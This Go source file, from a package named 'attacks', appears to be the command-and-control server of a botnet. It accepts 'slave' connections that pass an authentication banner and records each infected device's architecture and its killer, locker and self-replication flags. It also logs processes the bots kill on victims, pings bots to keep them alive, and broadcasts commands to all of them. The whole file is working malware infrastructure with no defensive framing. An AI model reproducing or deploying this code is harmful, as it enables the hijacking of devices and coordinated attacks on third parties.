package attacks

import (
	"admin/source/config"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"strings"
	"sync"
	"time"

	"golang.org/x/exp/slices"
)

// NewSlaveListener starts a new slave listener
func NewSlaveListener() error {
	listener, err := net.Listen("tcp", config.Options.GetString("slaves", "slaves.listener"))
	if err != nil {
		return err
	}

	fmt.Printf("[SLAVE] Listener started (%s)\r\n", config.Options.GetString("slaves", "slaves.listener"))

	var banner []byte = make([]byte, 0) // Converts auth banner ints into bytes
	for _, value := range config.Options.GetAnySlices("slaves", "slaves.authbanner") {
		banner = append(banner, byte(int(value.(float64))))
	}

	for { // Accepts incoming slave connection
		connection, err := listener.Accept()
		if err != nil {
			continue
		}

		go HandleSlave(connection, banner)
	}
}

type Device struct {
	Cores 				int
	Compiler			string
	Architecture		string
	OperatingSystem		string
	IndividualBroadcast chan []byte
	Connection			net.Conn
	Connected			time.Time
	
	Killer				bool // Default: true
	Locker 				bool // Default: true
	Selfrep 			bool // Default: true
}


var (
	// Holds all devices inside the device
	Devices map[net.Conn]*Device = make(map[net.Conn]*Device)
	mutex   sync.Mutex
)

// HandleSlave handles the incoming possible slave
func HandleSlave(conn net.Conn, banner []byte) {
	bufferBanner := make([]byte, len(banner))
	if _, err := conn.Read(bufferBanner); err != nil {
		return
	}

	fmt.Println(bufferBanner)

	// Compares the slave banner bytes
	if !slices.Equal(banner, bufferBanner) {
		return 
	}

	type Information struct {
		Architecture		string		// Arch of the device
		OperatingSystem		string		// OS of the device
		Cores	 			int			// Stores amount of cores
		Compiler		 	string		// Compiler of the binary	
		Selfrepping         bool
	}

	// Reads in from the device
	var bytes []byte = make([]byte, 1024)
	if _, err := conn.Read(bytes); err != nil {
		return
	}

	var info Information // Unmarshal the information from the device
	if err := json.Unmarshal([]byte(strings.Trim(string(bytes), "\x00")), &info); err != nil {
		return
	}

	var Device *Device = &Device{Cores: info.Cores, OperatingSystem: info.OperatingSystem, Architecture: info.Architecture, Compiler: info.Compiler, IndividualBroadcast: make(chan []byte), Connection: conn, Connected: time.Now(), Locker: true, Killer: true, Selfrep: info.Selfrepping}

	mutex.Lock()
	Devices[Device.Connection] = Device
	mutex.Unlock()

	log.Printf("(device) established [%s] [%s] [%s] {%d cores} (%s)", Device.Architecture, Device.OperatingSystem, Device.Compiler, Device.Cores, Device.Connection.RemoteAddr().String())

	defer func() { // Removes when done serving
		delete(Devices, Device.Connection)
		log.Printf("(device) disconnected [%s] [%s] [%s] {connection lasted %d minutes}", Device.Architecture, Device.OperatingSystem, Device.Compiler, int(time.Since(Device.Connected).Minutes()))
	}()


	go func() {
		for {
			alert := make([]byte, 64)
			if _, err := conn.Read(alert); err != nil {
				fmt.Println(err)
				return
			}

			switch alert[0] {

			case 99:
				log.Printf("process killed on %s: (\"%s\")", conn.RemoteAddr().String(), strings.ReplaceAll(string(alert[1:]), "\x00", ""))
			}
		}
	}()

	for {
		pingBound := time.NewTicker(100 * time.Second)
		select {

		// Writes the broadcast towards the device
		case single := <- Device.IndividualBroadcast:
			if _, err := conn.Write(single); err != nil {
				return
			}

		case <- pingBound.C:
			Device.Connection.Write([]byte{10})

			buf := make([]byte, 1)
			if _, err := Device.Connection.Read(buf); err != nil || buf[0] != 10 {
				return
			}

		}
	}
}

func Broadcast(b []byte) int {
	var correctlySent int = 0

	for _, device := range Devices {
		device.IndividualBroadcast <- b
		correctlySent++
	}

	return correctlySent
}

// Devices which are selfrepping
func SelfreppingDevices() int {
	var running int = 0

	// Ranges through all devices
	for _, device := range Devices {
		if device.Selfrep {
			running++
		}
	}

	return running
}